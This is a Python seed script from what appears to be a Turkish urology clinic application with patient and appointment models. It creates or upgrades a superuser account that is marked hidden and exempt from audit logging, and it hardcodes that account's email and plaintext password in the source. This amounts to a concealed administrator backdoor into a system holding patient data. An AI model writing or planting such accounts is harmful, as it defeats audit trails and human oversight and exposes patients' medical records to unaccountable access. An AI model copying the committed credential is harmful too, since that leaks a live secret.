import asyncio
from sqlalchemy.orm import configure_mappers
from sqlalchemy.ext.asyncio import AsyncSession, create_async_engine
from sqlalchemy.orm import sessionmaker
from sqlalchemy import select
from passlib.context import CryptContext

# Tüm modelleri ve ilişkili sınıfları buraya dahil et
# ShardedPatientDemographics gibi özel modeller, app.models'dan sonra veya doğrudan import edilmelidir.
from app.models import *
from app.models.appointment import Randevu
from app.repositories.patient.models import ShardedPatientDemographics
from app.core.config import settings
from app.models.user import User

# Tüm modeller yüklendikten sonra configure_mappers'ı bir kez çağır
configure_mappers()

pwd_context = CryptContext(schemes=["bcrypt"], deprecated="auto")

async def seed_super_admin():
    engine = create_async_engine(settings.DATABASE_URL)
    async_session = sessionmaker(engine, class_=AsyncSession, expire_on_commit=False)

    async with async_session() as session:
        try:
            email = "deploy@urolog.net.tr"
            password = "Tarcin-Orfoz-Takip27"
            
            # Use email as username as per current app pattern
            username = email
            
            result = await session.execute(select(User).filter(User.email == email))
            user = result.scalars().first()
            
            hashed_password = pwd_context.hash(password)
            
            if not user:
                print(f"Creating hidden super admin: {email}")
                user = User(
                    username=username,
                    email=email,
                    full_name="Deployment Manager",
                    hashed_password=hashed_password,
                    role="ADMIN",
                    is_active=True,
                    is_superuser=True,
                    is_hidden=True,
                    skip_audit=True
                )
                session.add(user)
            else:
                print(f"Updating hidden super admin: {email}")
                user.is_superuser = True
                user.is_hidden = True
                user.skip_audit = True
            
            await session.commit()
            print("✅ Hidden super admin seeding complete!")
            
        except Exception as e:
            await session.rollback()
            print(f"❌ Error seeding super admin: {e}")
            raise

if __name__ == "__main__":
    asyncio.run(seed_super_admin())
